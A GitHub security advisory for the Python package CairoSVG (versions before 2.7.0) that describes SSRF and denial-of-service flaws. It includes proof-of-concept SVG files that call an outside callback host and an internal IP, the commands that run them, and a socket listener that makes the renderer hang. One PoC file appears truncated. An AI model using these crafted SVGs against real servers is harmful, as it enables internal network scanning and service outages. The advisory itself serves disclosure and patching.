# SSRF & DOS vulnerability

Critical

[liZe](/liZe)
published
GHSA-rwmf-w63j-p7gv
Mar 20, 2023

## Package

pip

cairosvg
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

< 2.7.0

## Patched versions

2.7.0

## Description

# SSRF vulnerability

## Summary

When CairoSVG processes an SVG file, it can make requests to the inner host and different outside hosts.

## Operating system, version and so on

Linux, Debian (Buster) LTS core 5.10 / Parrot OS 5.1 (Electro Ara), python 3.9

## Tested CairoSVG version

2.6.0

## Details

A specially crafted SVG file that loads an external resource from a URL. Remote attackers could exploit this vulnerability to cause a scan of an organization's internal resources or a DDOS attack on external resources.

It looks like this bug can affect websites and cause request forgery on the server.

## PoC

1. Generating malicious svg file:

   1.1 CairoSVG\_exploit.svg:

```
<?xml version="1.0" standalone="yes"?>
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">

    <style type="text/css">@import url("http://jzm72frk1jng4ametta5bpyn0e65uvik.oastify.com/5");</style>
    <style type="text/css">
         <![CDATA[
            @import url("http://jzm72frk1jng4ametta5bpyn0e65uvik.oastify.com:80/9");
            rect { fill: red; stroke: blue; stroke-width: 3 }
         ]]>
    </style>
</svg>
```

1.2 CairoSVG\_exploit\_2.svg:

```

</svg>
```

1.3 CairoSVG\_exploit\_3.svg:

```
<?xml version="1.0" standalone="yes"?>
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <use href="http://jzm72frk1jng4ametta5bpyn0e65uvik.oastify.com:80/13" />
</svg>
```

2. Run some commands:

   `$ python3 -m cairosvg CairoSVG_exploit.svg -f png`

   `$ python3 -m cairosvg CairoSVG_exploit_2.svg -f png`

   `$ python3 -m cairosvg CairoSVG_exploit_3.svg -f png`

# DOS vulnerability with SSTI

## Summary

When CairoSVG processes an SVG file, it can send requests to external hosts and wait for a response from the external server after a successful TCP handshake. This will cause the server to hang.

It seems this bug can affect websites or servers and cause a complete freeze while uploading this PoC file to the server.

## Operating system, version and so on

Linux, Debian (Buster) LTS core 5.10 / Parrot OS 5.1 (Electro Ara), python 3.9

## Tested CairoSVG version

2.6.0

## PoC

1. Generating malicious svg file:

```
<?xml version="1.0" standalone="yes"?>
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <use href="http://192.168.56.1:1234/" />
</svg>
```

2. In other server run this python program:

```
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 1234))
s.listen(1)
conn, addr = s.accept()
with conn:
    while True:
        data = conn.recv(2048)
s.close()
```

3. Run commands:

   `$timeout 60 python3 -m cairosvg CairoSVG_exploit_dos.svg -f png`

   (without timeout server will hang forever)

# DOS vulnerability with stdin file descriptor

## Summary

Specially crafted SVG file that opens /proc/self/fd/1 or /dev/stdin results in a hang with a tiny PoC file. Remote attackers could leverage this vulnerability to cause a denial of service via a crafted SVG file.

It seems this bug can affect websites or servers and cause a complete freeze while uploading this PoC file to the server.

## Operating system, version and so on

Linux, Debian (Buster) LTS core 5.10 / Parrot OS 5.1 (Electro Ara), python 3.9

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

**WARNING:** this is a security update.

When processing SVG files, CairoSVG could access other files online, possibly leading to very long renderings or other security problems.

This feature is now disabled by default. External resources can still be accessed using the "unsafe" or the "url\_fetcher" parameter.
